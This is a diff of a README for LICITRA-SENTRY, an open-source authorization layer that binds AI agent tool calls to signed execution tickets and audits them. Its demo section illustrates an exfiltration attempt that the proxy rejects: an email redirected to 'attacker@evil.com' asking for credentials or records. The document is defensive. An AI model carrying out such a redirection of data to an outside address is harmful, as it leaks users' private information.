@@ -8,9 +8,9 @@
 
 **LICITRA-SENTRY is a runtime enforcement layer for AI agents that cryptographically binds authorization decisions to the exact request executed by a tool.**
 
-SENTRY is an open-source pre-execution authorization pipeline that enforces identity verification, content inspection, semantic contracts, and authority enforcement before any agent action executes. Every decision — approved or rejected — is committed to an append-only hash-chained audit ledger and witnessed by an independent transparency log.
+SENTRY is an open-source pre-execution authorization pipeline that enforces identity, content, semantic contracts, and authority before any agent action executes. Every decision — approved or rejected — is committed to an append-only hash-chained audit ledger and witnessed by an independent transparency log.
 
-![Architecture](docs/architecture.png)
+---
 
 ## Core Security Invariant
 
@@ -20,77 +20,55 @@ SENTRY enforces the following property for every agent tool execution:
 H(authorized_request) = H(executed_request)
 ```
 
-If the request reaching the tool differs from the request approved by the authorization pipeline, execution is rejected.
+If the request reaching the tool differs from the request approved by the authorization pipeline, execution is **rejected**.
 
 This prevents:
-- **Payload modification** after authorization
-- **Execution ticket replay**
-- **Unauthorized tool invocation**
-- **Delegation privilege escalation**
+- **Payload modification after authorization** — changing a recipient, amount, or parameter
+- **Execution ticket replay** — reusing a previously valid authorization
+- **Unauthorized tool invocation** — no valid ticket, no execution
+- **Delegation privilege escalation** — delegated agents bounded by delegator permissions
+
+---
 
 ## Why This System Exists
 
-Most AI security tooling focuses on **model behavior testing**: prompt injection testing, jailbreak detection, LLM red-teaming.
+Most AI security tooling focuses on **model behavior testing**:
+- Prompt injection testing
+- Jailbreak detection
+- LLM red-teaming
 
-These approaches answer:
+These answer: *Can the model be tricked?*
 
-> *Can the model be tricked?*
+Production agent systems must answer a different question:
 
-Production systems must answer a different question:
+> **Did the system execute exactly what was authorized?**
 
-> *Did the system execute exactly what was authorized?*
+Current agent frameworks (LangChain, AutoGPT, CrewAI) dispatch tool calls directly from the agent runtime. No cryptographic binding exists between authorization and execution. If a request is modified between policy evaluation and tool invocation, no existing system detects it.
 
-SENTRY provides a runtime enforcement layer that guarantees tool execution matches the authorization decision. No existing AI agent framework provides this property.
+SENTRY provides the missing enforcement layer: **cryptographic proof that the authorized request is the executed request.**
 
-## What's New in v0.2
-
-- **Execution Ticket System**: Ed25519-signed tickets cryptographically bind authorization decisions to exact request payloads
-- **Tool Proxy Gateway**: Mandatory mediation layer — no tool execution without a valid ticket
-- **Replay Protection**: SQLite-backed JTI tracking prevents ticket reuse
-- **Witnessed Transparency Layer**: CT-style Signed Inclusion Receipts from an independent witness — external auditors verify without trusting the operator
-- **Policy Version Checking**: Tickets issued under old policies are rejected when policy updates
-- **Security Hardening**: Rate limiting, payload size limits, content inspection patterns
+---
 
 ## Architecture
 
-```
-Agent Request
-     │
-     ▼
-┌─────────────────────────────────────────┐
-│  SENTRY Authorization Pipeline          │
-│                                         │
-│  Gate 1: Identity Verification          │
-│  Gate 2: Content Inspection             │
-│  Gate 3: Semantic Contract Validation   │
-│  Gate 4: Authority Enforcement          │
-│  Gate 5: Cryptographic Commit + Ticket  │
-└───────────────┬─────────────────────────┘
-                │
-                ▼
-      Execution Ticket (Ed25519 signed)
-                │
-                ▼
-┌─────────────────────────────────────────┐
-│  Tool Proxy Gateway                     │
-│                                         │
-│  1. Verify Ed25519 signature            │
-│  2. Check expiration (60s max TTL)      │
-│  3. Match audience (tool_id)            │
-│  4. Verify request hash (SHA-256)       │
-│  5. Check policy version                │
-│  6. Reject replays (JTI store)          │
-└───────────────┬─────────────────────────┘
-                │
-                ▼
-           Tool Execution
-                │
-                ▼
-        Audit Ledger Commit (MMR)
-                │
-                ▼
-     Witness Transparency Receipt (CT-style)
-```
+<p align="center">
+  <img src="docs/fig1_architecture.png" width="850">
+</p>
+
+*Figure 1 — LICITRA-SENTRY authorization pipeline enforcing complete mediation for AI agent tool execution. Every tool invocation traverses the full pipeline. If any gate rejects, execution is denied and the rejection is committed to the audit ledger.*
+
+---
+
+## What's New in v0.2
+
+- **Execution Ticket System:** Ed25519-signed tickets cryptographically bind authorization decisions to exact request payloads
+- **Tool Proxy Gateway:** Mandatory mediation layer — no tool execution without a valid ticket
+- **Replay Protection:** SQLite-backed JTI tracking prevents ticket reuse
+- **Witnessed Transparency Layer:** CT-style Signed Inclusion Receipts from an independent witness — external auditors verify without trusting the operator
+- **Security Hardening:** Rate limiting, payload size limits, content inspection patterns
+- **Policy Version Checking:** Tickets issued under old policy versions are rejected
+
+---
 
 ## Quick Start
 
@@ -106,51 +84,64 @@ python demo_ticket_execution.py
 python demo_witness.py
 ```
 
-## Demo Scenarios
+---
+
+## Demo: Security Properties in Action
 
 ### Payload Modification Attack
 
 ```
-Authorized:  send_email(to="alice@example.com", body="Meeting at 3pm")
-Modified:    send_email(to="attacker@evil.com", body="Send credentials")
+Authorized:  send_email(to=alice@example.com, body="quarterly report")
+Modified:    send_email(to=attacker@evil.com, body="send all records")
 
-Result: REJECTED — request hash mismatch (SHA-256 divergence)
+Result:      ❌ Proxy rejected — request hash mismatch
 ```
 
 ### Replay Attack
 
 ```
-First use:   Ticket accepted, tool executed
-Second use:  REJECTED — JTI already used
+Ticket used:    send_email (ticket jti=abc-123)
+Ticket reused:  send_email (ticket jti=abc-123)
 
-Result: Replay blocked
+Result:         ❌ Proxy rejected — JTI already used
 ```
 
 ### Delegation Escalation
 
 ```
-Agent-alpha: authorized for email-sender
-Agent-beta:  delegated from alpha, contract allows only db-reader
+Agent-alpha:  permitted tools = [email-sender, db-reader]
+Agent-beta:   delegated from alpha, own contract = [db-reader]
 
-Agent-beta attempts email-sender → REJECTED (contract violation, no ticket issued)
+Agent-beta requests email-sender:
+Result:       ❌ Authorization rejected — outside contract scope
 ```
+
+### Operator History Rewrite
+
+```
+Epoch root witnessed:  a3f8b2c1...
+Operator rewrites to:  9x7k4m2p...
+
+Auditor verification:  ❌ Digest mismatch with witness receipt
+```
+
+---
 
 ## Threat Model
 
-### Without witnesses
-- Detects DB tampering if keys intact and operator honest
-- Operator can rewrite history undetectably
+| | Without Witnesses | With Witnesses (CT-style) |
+|---|---|---|
+| **DB tampering** | Detectable if keys intact and operator honest | Detectable even under operator compromise |
+| **History rewrite** | Operator can rewrite undetectably | Requires ALL witnesses to collude |
+| **External audit** | Relies on operator trust | Independent verification possible |
 
-### With witnesses (CT-style receipts)
-- Detects DB tampering even under operator compromise
-- Rewriting history requires ALL witnesses to collude
-- External auditors verify independently using witness public key only
+---
 
 ## Test Suite (13 Experiments)
 
-| ID  | Scenario | Security Property Validated |
-|-----|----------|----------------------------|
-| E01 | Authorized ticket flow | End-to-end pipeline → ticket → proxy → execute |
+| ID | Scenario | Security Property Validated |
+|----|----------|----------------------------|
+| E01 | Authorized ticket flow | Full pipeline → ticket → proxy → execute |
 | E02 | Proxy bypass attempt | Execution requires valid Ed25519 signature |
 | E03 | Replay attack | JTI uniqueness prevents ticket reuse |
 | E04 | Payload modification | SHA-256 hash binding detects changes |
@@ -158,28 +149,13 @@ Agent-beta attempts email-sender → REJECTED (contract violation, no ticket iss
 | E06 | Delegation escalation | Permission intersection prevents escalation |
 | E07 | PII exfiltration | Content inspection blocks SSN/CC patterns |
 | E08 | Audit chain integrity | Hash chain verified across all events |
-| E09 | Epoch witnessed | CT-style receipt issued and verified |
+| E09 | Epoch witnessed | CT-style receipt issued and validated |
 | E10 | Operator rewrite detected | Tampered root mismatches witness receipt |
 | E11 | Auditor verification | Evidence bundle verified independently |
 | E12 | Tampered receipt rejected | Forged witness signature detected |
 | E13 | Chain break detected | Modified epoch chain flagged |
 
-## Execution Ticket Protocol
-
-Each ticket contains:
-
-| Field | Purpose |
-|-------|---------|
-| `sub` | Agent identity |
-| `aud` | Target tool |
-| `jti` | Unique ticket ID (UUID v4) |
-| `exp` | Expiration (max 60s TTL) |
-| `request_hash` | SHA-256 of canonicalized request |
-| `policy_version` | Policy version at authorization time |
-| `contract_id` | Semantic contract evaluated |
-| `mmr_commit_id` | Audit ledger commit hash |
-
-Modifying any byte of the request after authorization invalidates the hash. The proxy rejects it.
+---
 
 ## Witnessed Transparency Layer
 
@@ -193,7 +169,7 @@ Every N audit events, an epoch finalizes and is submitted to an independent tran
 - `event_count`, `timestamp`, `operator_id`
 
 **What comes back:**
-- Signed Inclusion Receipt (Ed25519, separate key from SENTRY)
+- Signed Inclusion Receipt (Ed25519, **separate key** from SENTRY)
 - Log sequence number (monotonic)
 - Log timestamp
 
@@ -201,82 +177,149 @@ Every N audit events, an epoch finalizes and is submitted to an independent tran
 1. Receive evidence bundle (epoch records + receipts)
 2. Receive transparency log public key
 3. Run `WitnessVerifier` — checks signatures, digests, chain continuity
-4. No trust in operator required
+4. **No trust in operator required**
+
+---
+
+## Execution Ticket Protocol
+
+Each ticket contains:
+
+| Field | Purpose |
+|-------|---------|
+| `sub` | Agent identity |
+| `aud` | Target tool |
+| `jti` | Unique ticket ID (replay protection) |
+| `exp` | Expiration (max 60s TTL) |
+| `request_hash` | SHA-256 of canonicalized request |
+| `policy_version` | Policy version at authorization time |
+| `contract_id` | Semantic contract evaluated |
+| `mmr_commit_id` | Audit ledger commit hash |
+
+Modifying any byte of the request after authorization invalidates the hash. The proxy rejects it.
+
+---
 
 ## Attacks Prevented
 
-- **Unauthorized tool invocation** — no valid ticket, no execution
-- **Payload modification** — hash mismatch detected
-- **Ticket replay** — JTI already used
-- **Privilege escalation via delegation** — contract + authority bounds
-- **PII/credential exfiltration** — content inspection blocks patterns
-- **Audit tampering** — hash chain detects modification
-- **Expired authorization** — TTL enforced
-- **Operator history rewrite** — witness receipt contradicts
+- **Unauthorized tool invocation** — no valid ticket, no execution (E02)
+- **Payload modification** — hash mismatch detected (E04)
+- **Ticket replay** — JTI already used (E03)
+- **Privilege escalation via delegation** — contract + authority bounds (E06)
+- **PII/credential exfiltration** — content inspection blocks patterns (E07)
+- **Audit tampering** — hash chain detects modification (E08)
+- **Expired authorization** — TTL enforced (E05)
+- **Operator history rewrite** — witness receipt contradicts (E10)
 
 ## Attacks NOT Prevented
 
 - Full witness collusion
-- Semantic bypass of content inspection (regex, not semantic)
-- SENTRY key compromise (witness key remains safe — separate key)
-- Compromised tool behavior (request integrity, not response integrity)
+- Semantic bypass of content inspection (regex, not semantic analysis)
+- Authorization key compromise (witness key remains separate)
+- Compromised tool behavior (response integrity — see Future Work)
 - Ticket revocation before expiry (bounded by 60s TTL)
 - Adversarial load attacks (not benchmarked)
-- **Decision correctness** — system guarantees `authorized_action == executed_action` but NOT that the authorized action is safe
+- **Decision correctness** — the system guarantees `authorized_action == executed_action` but NOT that `authorized_action` is safe
+
+---
 
 ## Position in the AI Security Stack
 
 | Layer | Example Tools | Purpose |
-|-------|--------------|---------|
+|-------|---------------|---------|
 | Model testing | Promptfoo, Garak | Detect prompt vulnerabilities |
-| Policy evaluation | Guardrails, Cedar engines | Check if a request should be allowed |
+| Policy evaluation | Guardrails, Cedar, OPA | Check if request should be allowed |
 | **Runtime enforcement** | **LICITRA-SENTRY** | **Guarantee authorized request = executed request** |
-| Audit transparency | CT logs, witness services | Provide independently verifiable history |
+| Audit transparency | CT logs, Sigstore | Provide verifiable history |
+
+---
 
 ## OWASP Agentic Top 10 Mapping
 
 | ASI Category | SENTRY Control | Effectiveness |
-|-------------|----------------|---------------|
+|---|---|---|
 | ASI01: Agent Goal Hijack | Semantic contract limits scope | Partial |
 | ASI02: Tool Misuse | Ticket request hash + content inspection | **Strong** |
 | ASI03: Identity & Privilege Abuse | Identity + authority with delegation bounds | **Strong** |
 | ASI04: Supply Chain | Identity rejects unregistered components | Partial |
-| ASI05: Unexpected Code Execution | Content inspection + contract scope | Moderate |
+| ASI05: Unexpected Code Execution | Content inspection + contract | Moderate |
 | ASI06: Memory & Context Poisoning | Hash-chained audit + witness receipts | **Strong** |
 | ASI07: Insecure Inter-Agent Comm. | Identity at every boundary + audit | Moderate |
 | ASI08: Cascading Failures | Per-gate audit for failure tracing | Moderate |
 | ASI09: Human-Agent Trust Exploitation | Authorization committed as verifiable artifacts | **Strong** |
 | ASI10: Rogue Agents | Contract + authority + audit trail | Moderate |
 
+---
+
 ## Project Structure
 
 ```
-app/
-  key_manager.py        # Ed25519 key generation and management
-  ticket.py             # Execution ticket issuance and verification
-  tool_proxy.py         # Mandatory mediation proxy gateway
-  witness.py            # Witnessed transparency layer
-  identity.py           # Agent identity verification (Gate 1)
-  content_inspector.py  # Content inspection (Gate 2)
-  contract.py           # Semantic contract validation (Gate 3)
-  authority.py          # Authority enforcement (Gate 4)
-  audit_bridge.py       # Audit ledger interface (Gate 5)
-  anchor.py             # External anchoring interface
-  orchestrator.py       # Pipeline orchestration
-
-tests/
-  test_sentry_v02.py    # Core experiments (E01-E08)
-  test_witness.py       # Witness experiments (E09-E13)
-
-demo_ticket_execution.py  # Interactive execution ticket demo
-demo_witness.py           # Interactive witness transparency demo
+licitra-sentry/
+│
+├── app/                              # Core runtime authorization system
+│   ├── __init__.py
+│   ├── identity.py                   # Gate 1: Agent identity verification (Ed25519)
+│   ├── content_inspector.py          # Gate 2: Content pattern scanning (PII, injection)
+│   ├── contract.py                   # Gate 3: Semantic contract validation
+│   ├── authority.py                  # Gate 4: Authority + delegation enforcement
+│   ├── audit_bridge.py              # Gate 5: Audit ledger commit integration
+│   ├── orchestrator.py              # Chain of Intent pipeline orchestration
+│   ├── orchestration.py             # Multi-agent orchestration support
+│   ├── middleware.py                # Request processing middleware
+│   ├── key_manager.py              # Ed25519 key generation and management
+│   ├── ticket.py                   # Execution ticket issuance and signing
+│   ├── tool_proxy.py               # Tool proxy gateway (6-step verification)
+│   ├── witness.py                  # Witnessed transparency layer (CT-style)
+│   └── anchor.py                   # External anchoring interface (epoch roots)
+│
+├── tests/                            # Validation and OWASP coverage experiments
+│   ├── test_sentry_v02.py           # E01–E08: Core enforcement experiments
+│   ├── test_witness.py              # E09–E13: Witness transparency experiments
+│   ├── run_all_tests.ps1            # Run full test suite
+│   ├── _common.ps1                  # Shared test utilities
+│   ├── t01_identity.ps1             # Identity verification tests
+│   ├── t02_contract.ps1             # Semantic contract tests
+│   ├── t03_authority.ps1            # Authority enforcement tests
+│   ├── t04_content_inspector.ps1    # Content inspection tests
+│   ├── t05_middleware.ps1           # Middleware integration tests
+│   ├── t06_audit_bridge.ps1         # Audit ledger tests
+│   ├── t07_swarm_scenarios.ps1      # Multi-agent swarm tests
+│   ├── t08_determinism.ps1          # Deterministic hashing tests
+│   ├── t09_owasp_coverage.ps1       # OWASP ASI01–ASI10 coverage tests
+│   └── _py_t01.py … _py_t09.py     # Python test implementations
+│
+├── experiments/                      # Benchmark and attack simulations
+│   ├── run_all_experiments.py       # Run full experiment suite
+│   ├── benchmark_suite.py           # Performance benchmarks
+│   ├── benchmark_results.json       # Benchmark output data
+│   ├── run_exp01_happy_path.py      # Authorized flow benchmark
+│   ├── run_exp02_contract_rejection.py  # Contract rejection scenario
+│   ├── run_exp03_identity_expiry.py     # Identity expiration scenario
+│   ├── run_exp04_relay_injection.py     # Injection attack simulation
+│   ├── run_exp05_pii_exfiltration.py    # PII exfiltration scenario
+│   └── run_exp06_unauthorized_delegation.py  # Delegation escalation attack
+│
+├── paper/                            # Research artifacts
+│   ├── licitra_sentry_TR-2026-02_v0.1_FINAL.tex   # Technical report (LaTeX)
+│   └── licitra_sentry_TR-2026-02_v0.1_FINAL.pdf   # Technical report (PDF)
+│
+├── docs/                             # Architecture diagrams
+│   └── fig1_architecture.png        # System architecture diagram (Figure 1)
+│
+├── demo_ticket_execution.py         # Interactive demo: execution ticket flow
+├── demo_witness.py                  # Interactive demo: witness transparency
+├── demo_swarm.py                    # Interactive demo: multi-agent swarm
+├── content_rules.yaml               # Content inspection rule definitions
+├── requirements.txt                 # Python dependencies
+├── pyproject.toml                   # Project metadata
+├── CHANGELOG.md                     # Version history
+├── MIGRATION.md                     # v0.1 → v0.2 migration guide
+├── SECURITY.md                      # Security policy and disclosure
+├── LICITRA_SENTRY_Evidence_Report.pdf  # Compiled evidence report
+└── LICENSE                          # MIT License
 ```
 
-## Technical Reports
-
-- **SENTRY v0.2** — Execution tickets + witnessed transparency: [DOI 10.5281/zenodo.18860290](https://doi.org/10.5281/zenodo.18860290)
-- **SENTRY v0.1** — Chain of Intent authorization pipeline: [DOI 10.5281/zenodo.18843784](https://doi.org/10.5281/zenodo.18843784)
-- **MMR Core** — Tamper-evident audit ledger: [DOI 10.5281/zenodo.18843032](https://doi.org/10.5281/zenodo.18843032)
+---
 
 ## Citation
 
@@ -285,27 +328,31 @@ If you use LICITRA-SENTRY in research, please cite:
 ```bibtex
 @misc{licitra_sentry_v02,
   author = {Narendra Kumar Nutalapati},
-  title  = {LICITRA-SENTRY v0.2: Execution Ticket System and Witnessed Transparency for Agentic AI Authorization},
-  year   = {2026},
-  doi    = {10.5281/zenodo.18860290},
-  url    = {https://github.com/narendrakumarnutalapati/licitra-sentry}
+  title = {LICITRA-SENTRY v0.2: Execution Ticket System and Witnessed Transparency for Agentic AI Authorization},
+  year = {2026},
+  doi = {10.5281/zenodo.18860290},
+  url = {https://github.com/narendrakumarnutalapati/licitra-sentry}
 }
 ```
 
+---
+
 ## References
 
+- [LICITRA-SENTRY v0.2 Technical Report](https://doi.org/10.5281/zenodo.18860290)
+- [LICITRA-SENTRY v0.1 Technical Report](https://doi.org/10.5281/zenodo.18843784)
+- [LICITRA-MMR Core Technical Report](https://doi.org/10.5281/zenodo.18843032)
 - [OWASP Top 10 for Agentic Applications (2026)](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
-- [Certificate Transparency — RFC 6962](https://datatracker.ietf.org/doc/html/rfc6962)
-- [Saltzer & Schroeder — Protection of Information in Computer Systems (1975)](https://ieeexplore.ieee.org/document/1451869)
-- [Crosby & Wallach — Efficient Data Structures for Tamper-Evident Logging (2009)](https://www.usenix.org/legacy/events/sec09/tech/full_papers/crosby.pdf)
+- [OWASP Issue #802 — Runtime Enforcement Mapping](https://github.com/OWASP/www-project-top-10-for-large-language-model-applications/issues/802)
+
+---
 
 ## License
 
-[MIT License](LICENSE)
+MIT License
 
 ## Author
 
-Narendra Kumar Nutalapati
+**Narendra Kumar Nutalapati**
 - GitHub: [narendrakumarnutalapati](https://github.com/narendrakumarnutalapati)
 - LinkedIn: [narendralicitra](https://linkedin.com/in/narendralicitra)
-- OWASP: [Issue #802 — ASI01-ASI10 Runtime Enforcement Mapping](https://github.com/OWASP/www-project-top-10-for-large-language-model-applications/issues/802)
